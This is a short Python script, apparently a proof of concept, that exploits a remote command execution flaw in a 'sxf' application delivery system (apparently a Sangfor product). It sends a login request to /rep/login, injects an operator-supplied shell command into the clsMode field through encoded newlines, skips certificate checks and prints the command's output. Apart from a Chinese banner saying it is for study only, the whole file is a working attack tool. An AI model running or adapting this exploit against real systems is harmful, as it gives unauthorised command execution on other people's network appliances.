import warnings
with warnings.catch_warnings():
    warnings.simplefilter("ignore")
    import urllib3.contrib.pyopenssl
import requests
import sys
import time
urllib3.contrib.pyopenssl.inject_into_urllib3()

def title():
    print("")
    print("")
    print('+------------------------------------------------------------')
    print('sxf应用交付系统RCE-----漏洞检测------------------------------')
    print("仅限学习使用，请勿用于非法测试！")
    print('使用方式：sxf_rce.py -u http://www.example.com -shell 命令')
    print('+------------------------------------------------------------')
    print("")
def poc(url,shell):
    headers= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data='''clsMode=cls_mode_login%0A'''+shell+'''%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'''
    # 无视证书不报错
    requests.packages.urllib3.disable_warnings()
    try:
        req=requests.post(url+"/rep/login",headers=headers,data=data,timeout=10,verify=False)
    except:
        print("请检查目标是否可访问")
        sys.exit()
    shell_str=req.text.find("cluster_mode_others")
    if shell_str != -1:
        result=req.text[shell_str+len("cluster_mode_others"):]
        print(result)
def arg():
    option=sys.argv[1]
    if option=="-u":
        url=sys.argv[2]
        option2=sys.argv[3]
        if option2=="-shell":
            shell=sys.argv[4]
            return url,shell
    else:
        print("使用方式：sxf_rce.py -u http://www.example.com -shell 命令")
        sys.exit()
if __name__ == '__main__':
    title()
    url,shell=arg()
    poc(url,shell)